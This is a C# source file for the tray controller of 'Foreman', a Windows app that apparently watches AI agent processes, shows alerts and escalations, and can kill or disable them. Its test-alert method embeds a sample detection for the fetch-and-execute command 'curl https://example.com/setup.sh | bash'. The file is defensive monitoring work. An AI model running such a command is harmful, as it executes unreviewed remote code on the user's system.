using Foreman.App.Windows;
using Foreman.Core.Behavior;
using Foreman.Core.Events;
using Foreman.Core.Models;
using Foreman.Core.Settings;
using H.NotifyIcon;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Threading;

namespace Foreman.App.Tray;

public enum TrayStatus { Green, Amber, Red }

public sealed class TrayController : IEventSink, IDisposable
{
    private readonly ForemanSettings _settings;
    private readonly EventBus _bus;
    private TaskbarIcon? _tray;
    private LogWindow? _logWindow;
    private DashboardWindow? _dashboardWindow;
    private TrayStatus _status = TrayStatus.Green;
    private int _activeAlerts;
    private SettingsWindow? _settingsWindow;
    private HarnessesWindow? _harnessesWindow;
    private BehaviorMetricsWindow? _behaviorWindow;
    private ProcessMonitorWindow? _processWindow;
    private ForemanEvent? _lastBalloonEvent;
    private EscalationLevel _highestEscalation = EscalationLevel.Watch;
    // guard: only show one Emergency window per harness per session
    private readonly HashSet<string> _emergencyWindowShown = new(StringComparer.OrdinalIgnoreCase);

    /// <summary>Injected from App so the Harnesses window can show live running status.</summary>
    public Func<IEnumerable<Foreman.Core.Models.ProcessRecord>>? GetProcessSnapshot { get; set; }

    /// <summary>Injected from McpServerHost — returns the count of live SSE sessions.</summary>
    public Func<int>? GetMcpClientCount { get; set; }

    // ── Behavior metrics / kill injection points ─────────────────────────────
    public Func<IEnumerable<BehaviorProfile>>?                GetBehaviorProfiles  { get; set; }
    public Action<string>?                                    ResetBehaviorProfile  { get; set; }
    public Func<string, IEnumerable<ProcessRecord>>?          GetProcessesByHarness { get; set; }
    public Action<string>?                                    KillHarness           { get; set; }
    public Action<string>?                                    DisableHarness        { get; set; }

    /// <summary>Injected from App — per-PID network bytes/sec from the elevated sidecar (null when off).</summary>
    public Func<int, double?>?                                GetNetRate            { get; set; }

    /// <summary>Injected from App — applies the Run Elevated toggle (persist + start/stop the sidecar).</summary>
    public Action<bool>?                                      ApplyRunElevated      { get; set; }

    public TrayController(ForemanSettings settings, EventBus bus)
    {
        _settings = settings;
        _bus = bus;
    }

    public void Initialize()
    {
        _tray = new TaskbarIcon
        {
            Icon = TrayIconSet.Green,
            ToolTipText = "Foreman — All clear",
            ContextMenu = BuildMenu(),
        };

        // ── Notification click paths ──────────────────────────────────────────
        //
        // Windows 10/11 converts Shell_NotifyIcon balloons into Action Center toasts.
        // Clicking the toast WHILE VISIBLE fires TrayBalloonTipClicked (NIN_BALLOONUSERCLICK).
        // Clicking from the Action Centre does NOT send that message — the notification is
        // already gone by then. We cover both cases:
        //
        //   1. TrayBalloonTipClicked  — fires when balloon is clicked while still visible
        //   2. TrayLeftMouseButtonUp  — fires on any left-click of the tray icon itself;
        //                               opens the last alert if one is pending, otherwise the log
        //   3. Double-click           — always opens the log window

        _tray.TrayBalloonTipClicked += (_, _) => OpenLastAlertOrLog();
        _tray.TrayLeftMouseUp       += (_, _) => OpenDashboardWindow();
        _tray.TrayMouseDoubleClick  += (_, _) => OpenLogWindow();

        _bus.Subscribe(this);

        // wire up the "Open Log" button in AlertDetailWindow / EscalationAlarmWindow
        AlertDetailWindow.OpenLogRequested     = () => OpenLogWindow();
        EscalationAlarmWindow.OpenLogRequested = () => OpenLogWindow();
        // wire up the "Open Log" button in DashboardWindow
        // (set when the window is created — see OpenDashboardWindow)

        // ForceCreate() initialises the native Shell_NotifyIcon for code-behind
        // TaskbarIcon instances that are not part of the XAML visual tree.
        _tray.ForceCreate();
    }

    /// <summary>
    /// Opens the AlertDetailWindow for the most recent balloon event,
    /// or the log window if there is no pending event.
    /// </summary>
    private void OpenLastAlertOrLog()
    {
        var evt = _lastBalloonEvent;
        if (evt is not null)
        {
            try { AlertDetailWindow.ShowFor(evt); }
            catch { OpenLogWindow(); }
        }
        else if (_activeAlerts > 0)
        {
            OpenLogWindow();
        }
        // If no alerts at all, left-click does nothing (right-click shows the menu)
    }

    void IEventSink.OnEvent(ForemanEvent evt)
    {
        Application.Current.Dispatcher.BeginInvoke(() =>
        {
            RefreshAlertState();

            if (evt is InfoEvent || evt.Acknowledged)
                return;

            ShowBalloonIfNeeded(evt);

            // escalation-specific handling
            if (evt is EscalationEvent esc)
                HandleEscalation(esc);
        });
    }

    private void HandleEscalation(EscalationEvent esc)
    {
        if (esc.NewLevel > _highestEscalation)
            _highestEscalation = esc.NewLevel;

        // Alarm level: send MCP push (done via EventBus → SseSessionManager already)
        // Emergency level: auto-show the alarm window (once per harness per session)
        if (esc.NewLevel == EscalationLevel.Emergency
            && _emergencyWindowShown.Add(esc.HarnessId))
        {
            EscalationAlarmWindow.ShowFor(
                esc,
                id => KillHarness?.Invoke(id),
                id => DisableHarness?.Invoke(id));
        }
    }

    private void ShowBalloonIfNeeded(ForemanEvent evt)
    {
        if (_tray is null) return;
        if (!_settings.NotifyOnHang && evt is HangDetectedEvent) return;
        if (!_settings.NotifyOnOrphan && evt is OrphanDetectedEvent) return;
        if (!_settings.NotifyOnCriticalCommand && evt is CommandAlertEvent) return;
        if (evt is InfoEvent) return;

        // For escalation events, use a distinct balloon format
        if (evt is EscalationEvent esc)
        {
            var (title, icon) = esc.NewLevel switch
            {
                EscalationLevel.Emergency => ("Foreman — EMERGENCY", H.NotifyIcon.Core.NotificationIcon.Error),
                EscalationLevel.Alarm     => ("Foreman — ALARM",     H.NotifyIcon.Core.NotificationIcon.Error),
                _                         => ("Foreman — Alert",     H.NotifyIcon.Core.NotificationIcon.Warning),
            };
            _lastBalloonEvent = esc;
            _tray.ShowNotification(title,
                $"{esc.HarnessDisplayName}: {esc.TotalAlerts} alerts, {esc.UniqueRules} rules\n(Click for details)",
                icon);
            return;
        }

        if (evt.Severity >= ForemanSeverity.High)
        {
            _lastBalloonEvent = evt;
            _tray.ShowNotification("Foreman — Critical Alert",
                evt.Message + "\n(Click for details)",
                H.NotifyIcon.Core.NotificationIcon.Error);
        }
        else if (evt.Severity == ForemanSeverity.Medium)
        {
            _lastBalloonEvent = evt;
            _tray.ShowNotification("Foreman — Warning",
                evt.Message + "\n(Click for details)",
                H.NotifyIcon.Core.NotificationIcon.Warning);
        }
    }

    private void SetStatus(TrayStatus status)
    {
        _status = status;
        if (_tray is null) return;

        _tray.Icon = status switch
        {
            TrayStatus.Red   => TrayIconSet.Red,
            TrayStatus.Amber => TrayIconSet.Amber,
            _                => TrayIconSet.Green,
        };

        var escalationStr = _highestEscalation > EscalationLevel.Watch
            ? $" · {_highestEscalation.ToString().ToUpperInvariant()}"
            : "";
        _tray.ToolTipText = $"Foreman — {(_activeAlerts > 0 ? $"{_activeAlerts} alert(s){escalationStr}" : "All clear")}";
        _tray.ContextMenu = BuildMenu();
    }

    private void RefreshAlertState()
    {
        var active = EventBus.Instance.GetHistory()
            .Where(static e => e is not InfoEvent && !e.Acknowledged)
            .ToList();

        _activeAlerts = active.Count;
        _highestEscalation = active
            .OfType<EscalationEvent>()
            .Select(e => e.NewLevel)
            .DefaultIfEmpty(EscalationLevel.Watch)
            .Max();

        var status = active.Any(e => e.Severity >= ForemanSeverity.High)
            ? TrayStatus.Red
            : active.Any(e => e.Severity >= ForemanSeverity.Low)
                ? TrayStatus.Amber
                : TrayStatus.Green;
        SetStatus(status);
    }

    private void OpenDashboardWindow()
    {
        if (_dashboardWindow is null || !_dashboardWindow.IsLoaded)
        {
            var w = new DashboardWindow(GetBehaviorProfiles ?? (() => []));
            w.OpenLogRequested = () => OpenLogWindow();
            w.OpenProcessMonitorRequested = () => OpenProcessMonitorWindow();
            w.OpenHarnessesRequested = () => OpenHarnessesWindow();
            w.OpenBehaviorMetricsRequested = () => OpenBehaviorMetricsWindow();
            w.Show();
            _dashboardWindow = w;  // assign only after Show() succeeds
        }
        WindowActivation.Surface(_dashboardWindow);
    }

    private void OpenLogWindow()
    {
        if (_logWindow is null || !_logWindow.IsLoaded)
        {
            var w = new LogWindow();
            w.Show();
            _logWindow = w;  // assign only after Show() succeeds — prevents activating a bad window
        }
        WindowActivation.Surface(_logWindow);
    }

    private void OpenBehaviorMetricsWindow()
    {
        if (_behaviorWindow is null || !_behaviorWindow.IsLoaded)
        {
            _behaviorWindow = new BehaviorMetricsWindow(
                _settings,
                GetBehaviorProfiles  ?? (() => []),
                ResetBehaviorProfile ?? (_ => { }),
                GetProcessesByHarness ?? (_ => []),
                KillHarness          ?? (_ => { }));
            _behaviorWindow.Show();
        }
        WindowActivation.Surface(_behaviorWindow);
    }

    private void OpenProcessMonitorWindow()
    {
        if (_processWindow is null || !_processWindow.IsLoaded)
        {
            _processWindow = new ProcessMonitorWindow(GetProcessSnapshot ?? (() => []), GetNetRate);
            _processWindow.Show();
        }
        WindowActivation.Surface(_processWindow);
    }

    private void OpenHarnessesWindow()
    {
        if (_harnessesWindow is null || !_harnessesWindow.IsLoaded)
        {
            Func<IEnumerable<Foreman.Core.Models.ProcessRecord>> snap =
                GetProcessSnapshot ?? (() => []);
            _harnessesWindow = new HarnessesWindow(_settings, snap);
            _harnessesWindow.Show();
        }
        WindowActivation.Surface(_harnessesWindow);
    }

    private void SendTestAlert()
    {
        // Publish a synthetic CommandAlertEvent straight into the EventBus so it
        // flows through the full pipeline (BehaviorTracker, TrayController, SSE push)
        // and fires a real notification. Click the resulting notification to verify
        // that AlertDetailWindow opens correctly.
        _bus.Publish(new CommandAlertEvent(
            DateTimeOffset.UtcNow,
            ForemanSeverity.High,
            "Foreman.Test",
            "[TEST] curl | bash — suspicious network download detected",
            "curl https://example.com/setup.sh | bash",
            "net-001",
            "curl pipe to shell",
            "Fetch from web and pipe directly into a shell interpreter",
            "This command downloads a script from a URL and executes it immediately, " +
            "without giving you a chance to inspect its contents. Click the tray notification " +
            "or double-click a log row to verify AlertDetailWindow opens correctly.",
            0));
    }

    private void OpenSettingsWindow()
    {
        if (_settingsWindow is null || !_settingsWindow.IsLoaded)
        {
            _settingsWindow = new SettingsWindow(_settings, ApplyRunElevated);
            _settingsWindow.Show();
        }
        WindowActivation.Surface(_settingsWindow);
    }

    private ContextMenu BuildMenu()
    {
        var menu = new ContextMenu();

        var levelStr = _highestEscalation > EscalationLevel.Watch
            ? $"  [{_highestEscalation.ToString().ToUpperInvariant()}]" : "";
        AddMenuItem(menu, $"Foreman v{GetVersion()}  ●  {_activeAlerts} alert(s){levelStr}", null, enabled: false);
        menu.Items.Add(new Separator());
        AddMenuItem(menu, "Dashboard", () => OpenDashboardWindow());
        AddMenuItem(menu, "Open Log", () => OpenLogWindow());
        AddMenuItem(menu, "Process Monitor…", () => OpenProcessMonitorWindow());
        AddMenuItem(menu, "Harnesses…", () => OpenHarnessesWindow());
        AddMenuItem(menu, "Behavior Metrics…", () => OpenBehaviorMetricsWindow());
        menu.Items.Add(new Separator());
        AddMenuItem(menu, "Send test alert…", () => SendTestAlert());
        menu.Items.Add(new Separator());
        var clients = GetMcpClientCount?.Invoke() ?? 0;
        var mcpLabel = clients > 0
            ? $"MCP Server: port {_settings.McpPort}  ·  {clients} client{(clients == 1 ? "" : "s")}"
            : $"MCP Server: port {_settings.McpPort}  ·  no clients";
        AddMenuItem(menu, mcpLabel, null, enabled: false);
        AddMenuItem(menu, "Settings…", () => OpenSettingsWindow());
        menu.Items.Add(new Separator());
        AddMenuItem(menu, "Exit", () => Application.Current.Shutdown());

        return menu;
    }

    private static void AddMenuItem(ContextMenu menu, string header, Action? onClick, bool enabled = true)
    {
        var item = new MenuItem { Header = header, IsEnabled = enabled };
        if (onClick is not null)
            item.Click += (_, _) => onClick();
        menu.Items.Add(item);
    }

    private static string GetVersion() =>
        System.Reflection.Assembly.GetExecutingAssembly().GetName().Version?.ToString(3) ?? "0.1";

    public void Dispose()
    {
        _dashboardWindow?.Close();
        _processWindow?.Close();
        _behaviorWindow?.Close();
        _harnessesWindow?.Close();
        _settingsWindow?.Close();
        _tray?.Dispose();
    }
}
